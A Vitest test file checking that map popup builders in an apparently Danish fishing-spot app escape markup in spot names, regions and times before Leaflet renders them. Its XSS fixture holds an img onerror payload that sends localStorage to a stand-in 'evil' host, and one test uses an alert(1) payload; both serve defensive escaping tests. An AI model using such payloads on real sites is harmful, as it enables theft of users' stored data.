import { describe, it, expect, beforeEach } from 'vitest'
import { lang } from './i18n'
import { catalogueSpotPopup, officialSpotPopup, ownSpotPopup, savedSpotPopup } from './mapPopups'
import type { Location, ScoredWindow } from './types'

/**
 * Every Leaflet popup in MapTab and MapView is built here, and Leaflet writes a
 * string popup with innerHTML. So these are the sinks: each must turn markup in
 * a location name (or window time) into inert text.
 */
const XSS = 'Køge Havn<img src=x onerror=fetch(\'//evil/?\'+btoa(JSON.stringify(localStorage)))>'

/** Tag names the string would create if handed to innerHTML. */
const tagsIn = (s: string) => [...s.matchAll(/<\s*([a-z][a-z0-9]*)/gi)].map((m) => m[1].toLowerCase())
const ALLOWED = new Set(['strong', 'br', 'span'])

function expectInert(out: string) {
  expect(tagsIn(out).filter((tag) => !ALLOWED.has(tag))).toEqual([])
  expect(out).not.toMatch(/<img/i)
  expect(out).toContain('&lt;img src=x onerror=')
}

const loc = (name: string): Location => ({ id: 'a', name, lat: 55.45, lon: 12.19 })
const win = (l: Location, extra: Partial<ScoredWindow> = {}): ScoredWindow => ({
  location: l, date: new Date(Date.UTC(2026, 5, 15)), from: '06:00', to: '09:00',
  score: 72, noData: false, bestHourStr: null, tags: [], ...extra,
})

describe('map popups', () => {
  beforeEach(() => { lang.value = 'da' })

  it('dashboard map: own spot name is escaped, with and without a score', () => {
    const l = loc(XSS)
    expectInert(ownSpotPopup(l, win(l)))
    expectInert(ownSpotPopup(l, undefined))
  })

  it('dashboard map: window times from a shared link are escaped', () => {
    const l = loc('Molen')
    const out = ownSpotPopup(l, win(l, { from: '06:00<img src=x onerror=alert(1)>', to: '09:00' }))
    expect(tagsIn(out).filter((tag) => !ALLOWED.has(tag))).toEqual([])
  })

  it('dashboard map: official spot name is escaped', () => {
    expectInert(officialSpotPopup(win(loc(XSS)), 4))
    expectInert(officialSpotPopup(win(loc(XSS)), undefined))
  })

  it('setup map: saved spot name is escaped, with and without a score', () => {
    expectInert(savedSpotPopup(loc(XSS), 55))
    expectInert(savedSpotPopup(loc(XSS), undefined))
  })

  it('setup map: catalogue spot fields are escaped', () => {
    expectInert(catalogueSpotPopup({ name: XSS, region: 'Sjælland' }, 'Kyst', 'Havørred, Sild'))
    expectInert(catalogueSpotPopup({ name: 'Tejn', region: XSS }, 'Mole', ''))
    expectInert(catalogueSpotPopup({ name: 'Tejn', region: 'Bornholm' }, 'Mole', XSS))
  })

  it("says why a pin is capped: today's lightning reading is shown", () => {
    const l = loc('Molen')
    const storm = win(l, { score: 15, lightning: { level: 'danger', closestKm: null } })
    expect(officialSpotPopup(storm, 8)).toContain('⚡')
    expect(ownSpotPopup(l, storm)).toContain('⚡')
    expect(officialSpotPopup(win(l), 8)).not.toContain('⚡')
  })

  it('still renders the ordinary content', () => {
    const l = loc('Dragør mole')
    const out = ownSpotPopup(l, win(l))
    expect(out).toContain('<strong>📍 Dragør mole</strong>')
    expect(out).toContain('72 · ')
    expect(out).toContain('06:00–09:00')
    expect(out).toContain('15.') // the window's date
  })
})
